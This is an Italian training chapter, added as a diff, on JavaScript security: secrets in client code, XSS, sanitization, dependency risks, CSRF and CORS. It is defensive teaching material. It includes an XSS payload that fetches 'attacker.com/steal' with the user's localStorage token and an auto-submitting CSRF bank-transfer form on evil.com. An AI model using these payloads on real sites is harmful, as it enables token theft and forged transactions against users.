@@ -1,0 +1,610 @@
+---
+title: "Sicurezza in JavaScript"
+description: "XSS attacks, sanitizzazione input, informazioni sensibili nel codice client-side, sicurezza delle librerie third-party e CSRF"
+date: 2026-02-17
+tags: ['formazione', 'javascript']
+authors: ['vitoesposito']
+order: 22
+---
+
+## Introduzione
+
+La sicurezza è un aspetto fondamentale nello sviluppo di applicazioni JavaScript. A differenza di altri linguaggi che vengono compilati, il codice JavaScript nel browser è sempre accessibile e leggibile dagli utenti, creando vulnerabilità specifiche che devono essere comprese e mitigate.
+
+In questo capitolo si approfondiscono:
+
+- **Informazioni sensibili nel codice**: perché non esporre dati confidenziali nel codice client-side
+- **XSS (Cross-Site Scripting)**: attacchi che iniettano codice JavaScript malevolo
+- **Sanitizzazione**: pulire input utente prima di renderizzarlo
+- **Sicurezza delle librerie**: rischi delle dipendenze third-party
+- **CSRF (Cross-Site Request Forgery)**: attacchi che sfruttano sessioni utente
+- **CORS**: meccanismo di sicurezza per richieste cross-origin
+
+---
+
+## Informazioni Sensibili nel Codice Client-Side
+
+### Il Problema Fondamentale
+
+Il codice JavaScript che viene eseguito nel browser è **sempre accessibile e leggibile** dagli utenti. A differenza di applicazioni compilate, il codice sorgente viene inviato al browser e può essere ispezionato, analizzato e copiato da chiunque visiti la pagina.
+
+Questo significa che qualsiasi informazione sensibile inclusa nel codice client-side è esposta e può essere letta o abusata da utenti malintenzionati.
+
+### Cosa Non Mettere nel Codice Client-Side
+
+**1. Credenziali di Database**
+```javascript
+// ❌ MAI fare questo nel codice client-side
+const dbPassword = 'mySecretPassword123';
+const dbUser = 'admin';
+```
+
+Se queste credenziali sono nel codice JavaScript, chiunque può:
+- Leggerle aprendo gli strumenti di sviluppo
+- Usarle per connettersi direttamente al database
+- Modificare o eliminare dati
+- Accedere a informazioni di altri utenti
+
+**2. Chiavi API Private**
+```javascript
+// ❌ Pericoloso se non protetto
+const apiKey = 'sk_live_1234567890abcdef';
+```
+
+Le chiavi API private devono rimanere sul server. Se esposte, possono essere usate per:
+- Eseguire operazioni a nome dell'applicazione
+- Consumare quote API
+- Accedere a dati riservati
+
+**3. Dati di Altri Utenti**
+```javascript
+// ❌ Espone dati di tutti gli utenti
+const allUsers = [
+  { id: 1, email: 'user1@example.com', password: 'hash123' },
+  { id: 2, email: 'user2@example.com', password: 'hash456' }
+];
+```
+
+Anche se sembra ovvio, errori di questo tipo possono esporre informazioni personali di migliaia di utenti.
+
+### Codice Client-Side vs Server-Side
+
+**Codice Client-Side (Browser)**:
+- Visibile a tutti gli utenti
+- Può essere letto, copiato e modificato
+- Non può contenere informazioni sensibili
+- Eseguito sulla macchina dell'utente
+
+**Codice Server-Side (Node.js)**:
+- Eseguito solo sul server
+- Non inviato al browser
+- Può contenere credenziali e dati sensibili
+- Accessibile solo se il server viene compromesso
+
+### Esempio Pratico
+
+```javascript
+// ❌ Client-side (pericoloso)
+// app.js nel browser
+const dbConnection = {
+  host: 'database.example.com',
+  user: 'admin',
+  password: 'secret123'
+};
+
+// ✅ Server-side (sicuro)
+// server.js su Node.js
+const dbConnection = {
+  host: process.env.DB_HOST,
+  user: process.env.DB_USER,
+  password: process.env.DB_PASSWORD
+};
+```
+
+Nel codice server-side, le credenziali possono essere lette da variabili d'ambiente che non vengono mai inviate al browser.
+
+### Minificazione Non È Protezione
+
+Anche se il codice viene minificato o offuscato per la produzione:
+
+```javascript
+// Codice originale
+const apiKey = 'sk_live_1234567890abcdef';
+
+// Codice minificato
+const a='sk_live_1234567890abcdef';
+```
+
+La minificazione rende il codice più difficile da leggere ma **non lo nasconde**. Gli strumenti di sviluppo del browser possono formattare il codice minificato ("Pretty Print"), rendendolo nuovamente leggibile. Inoltre, stringhe come password e chiavi API rimangono identiche anche dopo la minificazione e possono essere trovate facilmente con una ricerca nel codice.
+
+### Best Practices
+
+- **Nessuna informazione sensibile** nel codice client-side
+- **Usare variabili d'ambiente** sul server per credenziali
+- **Validare e sanitizzare** tutti gli input utente
+- **Usare API keys pubbliche** quando possibile, con restrizioni configurate sul provider
+- **Limitare permessi** delle API keys quando devono essere esposte (es. solo da determinati IP)
+
+---
+
+## XSS (Cross-Site Scripting) Attacks
+
+### Cos'è un Attacco XSS
+
+Un attacco **XSS (Cross-Site Scripting)** si verifica quando codice JavaScript malevolo viene iniettato in un'applicazione web e viene eseguito nel contesto di altri utenti. Questo permette agli attaccanti di:
+
+- Eseguire codice JavaScript a nome dell'applicazione
+- Rubare dati sensibili (cookie, localStorage, sessioni)
+- Inviare richieste HTTP a server malintenzionati con dati dell'utente
+- Modificare il contenuto della pagina per ingannare gli utenti
+- Intercettare input dell'utente (password, dati di pagamento)
+
+### Come Funziona un Attacco XSS
+
+L'attacco sfrutta il fatto che l'applicazione inserisce contenuto generato dall'utente nel DOM senza validazione o sanitizzazione. Quando questo contenuto contiene codice JavaScript, viene eseguito nel contesto dell'applicazione.
+
+### Esempio: Vulnerabilità con innerHTML
+
+Immagina un'applicazione che mostra un indirizzo passato tramite URL:
+
+```javascript
+// Codice vulnerabile
+const urlParams = new URLSearchParams(window.location.search);
+const address = urlParams.get('address');
+
+document.querySelector('h1').innerHTML = address;
+```
+
+Se un utente visita:
+```
+https://example.com/?address=6th Avenue
+```
+
+Il codice funziona correttamente. Ma se un attaccante crea questo link:
+```
+https://example.com/?address=<img src="x" onerror="alert('XSS!')">
+```
+
+Il codice JavaScript nell'attributo `onerror` viene eseguito quando l'immagine fallisce il caricamento.
+
+### Perché innerHTML è Pericoloso
+
+`innerHTML` inserisce HTML nel DOM, permettendo l'esecuzione di script:
+
+```javascript
+// ❌ Vulnerabile a XSS
+element.innerHTML = userInput;
+
+// ✅ Sicuro
+element.textContent = userInput;
+```
+
+`textContent` inserisce solo testo, non HTML, quindi qualsiasi tag viene trattato come testo normale e non viene eseguito.
+
+### Altri Vettori di Attacco XSS
+
+Oltre a `innerHTML`, ci sono altri modi in cui codice può essere iniettato:
+
+**1. Attributi HTML con event handlers**
+```javascript
+// Vulnerabile
+element.setAttribute('onerror', userInput);
+```
+
+**2. URL inseriti direttamente**
+```javascript
+// Vulnerabile se userInput contiene javascript:
+element.href = userInput;
+```
+
+**3. Eval e funzioni simili**
+```javascript
+// Estremamente pericoloso
+eval(userInput);
+```
+
+### Esempio Completo di Attacco
+
+Un attaccante potrebbe creare un link che sembra innocuo ma contiene codice malevolo:
+
+```javascript
+// URL preparato dall'attaccante
+const maliciousURL = 'https://example.com/?address=' + 
+  encodeURIComponent('<img src="x" onerror="' +
+    'fetch(\'https://attacker.com/steal?data=\' + ' +
+    'localStorage.getItem(\'token\'))">');
+
+// Quando un utente visita questo link, il codice:
+// 1. Crea un'immagine che fallisce
+// 2. Esegue l'onerror handler
+// 3. Invia il token al server dell'attaccante
+```
+
+### Protezione: Usare textContent
+
+La soluzione più semplice è usare `textContent` invece di `innerHTML` quando possibile:
+
+```javascript
+// ✅ Sicuro
+const address = urlParams.get('address');
+document.querySelector('h1').textContent = address;
+```
+
+Con `textContent`, qualsiasi HTML o JavaScript viene trattato come testo normale e non viene eseguito.
+
+### Protezione: Sanitizzazione
+
+Quando è necessario inserire HTML (ad esempio per formattazione), bisogna sanitizzare l'input prima di inserirlo:
+
+```bash
+npm install sanitize-html
+```
+
+```javascript
+const sanitizeHtml = require('sanitize-html');
+
+// Sanitizza l'input rimuovendo script e attributi pericolosi
+const safeHTML = sanitizeHtml(userInput, {
+  allowedTags: ['b', 'i', 'em', 'strong', 'p'],
+  allowedAttributes: {}
+});
+
+element.innerHTML = safeHTML;
+```
+
+**Importante**: la sanitizzazione dovrebbe essere fatta **sul server** prima di salvare i dati nel database, non solo nel browser. Questo garantisce che dati malintenzionati non vengano mai memorizzati.
+
+### Sanitizzazione Lato Server
+
+Nel codice Node.js:
+
+```javascript
+const sanitizeHtml = require('sanitize-html');
+
+app.post('/api/posts', (req, res) => {
+  const userContent = req.body.content;
+  
+  // Sanitizza prima di salvare
+  const sanitizedContent = sanitizeHtml(userContent, {
+    allowedTags: ['b', 'i', 'p'],
+    allowedAttributes: {}
+  });
+  
+  // Ora è sicuro salvare nel database
+  db.posts.insert({ content: sanitizedContent });
+});
+```
+
+Sanitizzando sul server, anche se si dimentica di sanitizzare nel browser, i dati nel database sono già puliti.
+
+### Protezione: Content Security Policy
+
+Un'altra protezione è configurare **Content Security Policy (CSP)** headers sul server:
+
+```javascript
+// Node.js/Express
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    "default-src 'self'; script-src 'self'"
+  );
+  next();
+});
+```
+
+CSP limita quali script possono essere eseguiti, riducendo l'impatto di attacchi XSS.
+
+---
+
+## Sicurezza delle Librerie Third-Party
+
+### Il Problema delle Dipendenze
+
+Quando si usa una libreria JavaScript da npm o un CDN, si sta eseguendo codice scritto da altri sviluppatori. Questo codice viene eseguito con gli stessi privilegi del proprio codice, quindi può:
+
+- Accedere a tutte le API del browser
+- Leggere e modificare il DOM
+- Inviare richieste HTTP
+- Accedere a localStorage, cookies, sessionStorage
+- Eseguire qualsiasi operazione che il proprio codice può fare
+
+### Rischi delle Librerie Compromesse
+
+**1. Libreria Compromessa**
+Se una libreria viene compromessa (hack del repository, sviluppatore malevolo, dipendenza compromessa), il codice malevolo viene eseguito su tutte le applicazioni che la usano.
+
+**2. Libreria Non Mantenuta**
+Librerie abbandonate possono contenere vulnerabilità note che non vengono mai risolte.
+
+**3. Dipendenze Nidificate**
+Una libreria può dipendere da altre librerie, creando una catena di fiducia. Una vulnerabilità in una dipendenza profonda può compromettere l'intera applicazione.
+
+### Verificare le Vulnerabilità
+
+npm include uno strumento per verificare vulnerabilità note:
+
+```bash
+npm audit
+```
+
+Questo comando analizza tutte le dipendenze e segnala vulnerabilità conosciute:
+
+```
+found 0 vulnerabilities
+```
+
+Se vengono trovate vulnerabilità, npm suggerisce come risolverle:
+
+```bash
+npm audit fix
+```
+
+### Best Practices per le Librerie
+
+**1. Usare Librerie Affidabili**
+- Preferire librerie con molti maintainer attivi
+- Controllare la frequenza degli aggiornamenti
+- Verificare la community e il supporto
+
+**2. Mantenere Aggiornate**
+```bash
+# Verificare aggiornamenti disponibili
+npm outdated
+
+# Aggiornare dipendenze
+npm update
+```
+
+**3. Limitare le Dipendenze**
+- Usare solo librerie necessarie
+- Evitare librerie che aggiungono molte dipendenze
+- Considerare alternative più leggere
+
+**4. Verificare il Codice Sorgente**
+Per librerie piccole o critiche, è utile esaminare il codice sorgente per verificare che non faccia operazioni sospette:
+- Accesso non necessario a localStorage
+- Richieste HTTP a domini sconosciuti
+- Codice offuscato o minificato nel repository
+
+**5. Usare Lock Files**
+`package-lock.json` blocca le versioni esatte delle dipendenze, prevenendo aggiornamenti automatici che potrebbero introdurre vulnerabilità.
+
+### Esempio: Verifica di una Libreria
+
+Prima di installare una libreria, verificare:
+- Numero di download settimanali
+- Data dell'ultimo aggiornamento
+- Numero di issue aperte
+- Presenza di maintainer attivi
+- Documentazione completa
+
+```bash
+# Verificare informazioni su una libreria
+npm view sanitize-html
+```
+
+---
+
+## CSRF (Cross-Site Request Forgery)
+
+### Cos'è un Attacco CSRF
+
+**CSRF (Cross-Site Request Forgery)** è un attacco che induce un utente autenticato a eseguire azioni non intenzionali su un'applicazione web in cui è loggato. L'attacco sfrutta il fatto che i browser inviano automaticamente i cookie di sessione con ogni richiesta.
+
+### Come Funziona
+
+**Scenario tipico**:
+1. L'utente è loggato su `banking.com` (ha un cookie di sessione valido)
+2. L'utente visita `evil.com` (sito controllato dall'attaccante)
+3. `evil.com` contiene un form o uno script che invia una richiesta a `banking.com`
+4. Il browser invia automaticamente il cookie di sessione con la richiesta
+5. `banking.com` riconosce la sessione valida ed esegue l'azione
+6. L'utente ha eseguito un'azione senza volerlo
+
+### Esempio di Attacco CSRF
+
+```html
+<!-- Pagina su evil.com -->
+<form action="https://banking.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker-account">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>
+  document.forms[0].submit(); // Invia automaticamente
+</script>
+```
+
+Se l'utente visita questa pagina mentre è loggato su `banking.com`, il trasferimento viene eseguito automaticamente.
+
+### Protezione: CSRF Tokens
+
+La protezione standard contro CSRF è usare **CSRF tokens**:
+
+**1. Server genera un token unico per ogni sessione**
+```javascript
+// Server-side (Node.js)
+const csrfToken = generateRandomToken();
+req.session.csrfToken = csrfToken;
+res.render('form', { csrfToken });
+```
+
+**2. Token incluso nel form**
+```html
+<form action="/transfer" method="POST">
+  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+  <!-- altri campi -->
+</form>
+```
+
+**3. Server verifica il token**
+```javascript
+app.post('/transfer', (req, res) => {
+  if (req.body._csrf !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+  }
+  // Procedi con la richiesta
+});
+```
+
+Poiché `evil.com` non può leggere il token (a causa della same-origin policy), non può creare una richiesta valida.
+
+### Protezione: SameSite Cookies
+
+Un'altra protezione è configurare i cookie con l'attributo `SameSite`:
+
+```javascript
+// Server-side
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,
+  sameSite: 'strict' // o 'lax'
+});
+```
+
+- `strict`: il cookie non viene inviato con richieste cross-site
+- `lax`: il cookie viene inviato solo con richieste GET cross-site (più permissivo)
+
+### Nota Importante
+
+CSRF è principalmente una vulnerabilità **server-side**, non specifica di JavaScript. La protezione deve essere implementata sul backend. JavaScript può aiutare a includere i token nei form, ma la validazione avviene sempre sul server.
+
+---
+
+## CORS (Cross-Origin Resource Sharing)
+
+### Cos'è CORS
+
+**CORS (Cross-Origin Resource Sharing)** è un meccanismo di sicurezza del browser che controlla quali richieste cross-origin sono permesse. Non è un attacco, ma un meccanismo di sicurezza che può bloccare richieste legittime se non configurato correttamente.
+
+### Same-Origin Policy
+
+Per default, i browser applicano la **same-origin policy**: le richieste possono essere fatte solo allo stesso origin (stesso protocollo, dominio e porta). Due URL sono dello stesso origin solo se tutti e tre questi elementi corrispondono.
+
+### Quando Serve CORS
+
+CORS è necessario quando:
+- Il frontend è su `localhost:8080`
+- Il backend è su `localhost:3000`
+- Sono considerati origini diverse (porte diverse)
+
+O quando:
+- Il frontend è su `app.example.com`
+- Il backend è su `api.example.com`
+- Sono considerati origini diverse (sottodomini diversi)
+
+### Configurare CORS sul Server
+
+Il server deve inviare headers CORS appropriati per permettere richieste cross-origin:
+
+```javascript
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  next();
+});
+```
+
+**Headers CORS principali**:
+- `Access-Control-Allow-Origin`: origini permesse (`*` = tutte, o un'origine specifica)
+- `Access-Control-Allow-Methods`: metodi HTTP permessi
+- `Access-Control-Allow-Headers`: headers che il client può inviare
+
+### Preflight Requests
+
+Per alcune richieste (POST con JSON, metodi custom), il browser invia prima una richiesta **OPTIONS** per verificare i permessi:
+
+```javascript
+// Il browser invia automaticamente OPTIONS prima di POST
+// Il server deve rispondere correttamente
+app.options('*', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.sendStatus(200);
+});
+```
+
+### CORS e Moduli JavaScript
+
+I moduli JavaScript hanno una restrizione aggiuntiva: possono essere importati solo da script serviti dallo stesso origin. Questo è il motivo per cui serve un web server anche per sviluppo locale quando si usano moduli.
+
+```javascript
+// ✅ Funziona: stesso origin
+import { Component } from './Component.js';
+
+// ❌ Bloccato: origin diverso (senza CORS configurato)
+import { Component } from 'https://other-domain.com/Component.js';
+```
+
+### Best Practices CORS
+
+- **Non usare `*` in produzione**: specificare origini esatte
+- **Limitare metodi permessi**: permettere solo quelli necessari
+- **Limitare headers permessi**: solo quelli effettivamente usati
+- **Usare middleware dedicato**: `cors` package per Express invece di configurazione manuale
+
+```javascript
+const cors = require('cors');
+
+app.use(cors({
+  origin: 'https://myapp.com',
+  methods: ['GET', 'POST'],
+  allowedHeaders: ['Content-Type']
+}));
+```
+
+---
+
+## Checklist di Sicurezza
+
+### Codice Client-Side
+
+- [ ] Nessuna credenziale o informazione sensibile nel codice
+- [ ] Nessun uso di `innerHTML` con input utente non sanitizzato
+- [ ] Uso di `textContent` quando possibile invece di `innerHTML`
+- [ ] Sanitizzazione di tutti gli input utente prima del rendering
+- [ ] Validazione degli input sia client-side che server-side
+- [ ] Content Security Policy configurata
+
+### Librerie e Dipendenze
+
+- [ ] Dipendenze aggiornate regolarmente
+- [ ] `npm audit` eseguito periodicamente
+- [ ] Solo librerie da fonti affidabili
+- [ ] Verifica del codice sorgente per librerie critiche
+- [ ] `package-lock.json` committato nel repository
+
+### Server-Side
+
+- [ ] Sanitizzazione di tutti gli input prima di salvarli
+- [ ] CSRF tokens implementati per form e richieste state-changing
+- [ ] Validazione server-side di tutti gli input
+- [ ] Headers di sicurezza configurati (CORS, CSP, ecc.)
+- [ ] Credenziali in variabili d'ambiente, non nel codice
+- [ ] Gestione corretta degli errori (non esporre stack trace)
+
+### Autenticazione e Sessioni
+
+- [ ] Cookie con flag `httpOnly` per prevenire accesso via JavaScript
+- [ ] Cookie con flag `secure` su HTTPS
+- [ ] Cookie con `sameSite` configurato appropriatamente
+- [ ] Token di sessione sicuri e randomici
+- [ ] Timeout delle sessioni configurato
+
+---
+
+## Riepilogo
+
+- **Informazioni sensibili**: il codice JavaScript client-side è sempre leggibile dagli utenti. Non includere mai credenziali, chiavi API private o dati confidenziali nel codice che viene eseguito nel browser.
+
+- **XSS (Cross-Site Scripting)**: attacchi che iniettano codice JavaScript malevolo nell'applicazione. Proteggersi usando `textContent` invece di `innerHTML`, sanitizzando tutti gli input utente, preferibilmente sul server prima di salvarli.
+
+- **Sanitizzazione**: processo di pulizia dell'input rimuovendo codice potenzialmente pericoloso. Usare librerie come `sanitize-html` e fare la sanitizzazione sul server quando possibile.
+
+- **Librerie third-party**: codice esterno può essere compromesso o contenere vulnerabilità. Verificare regolarmente con `npm audit`, mantenere aggiornate le dipendenze, usare solo librerie affidabili e mantenute attivamente.
+
+- **CSRF (Cross-Site Request Forgery)**: attacchi che sfruttano sessioni utente per eseguire azioni non autorizzate. Proteggersi con CSRF tokens e cookie `SameSite`. Principalmente una vulnerabilità server-side.
+
+- **CORS (Cross-Origin Resource Sharing)**: meccanismo di sicurezza che controlla richieste cross-origin. Configurare headers appropriati sul server per permettere richieste legittime, limitando origini, metodi e headers permessi.
+
+- **Best practices**: validare e sanitizzare input sia client che server-side, usare Content Security Policy, mantenere dipendenze aggiornate, configurare correttamente cookie di sessione, non esporre informazioni sensibili nel codice client-side.
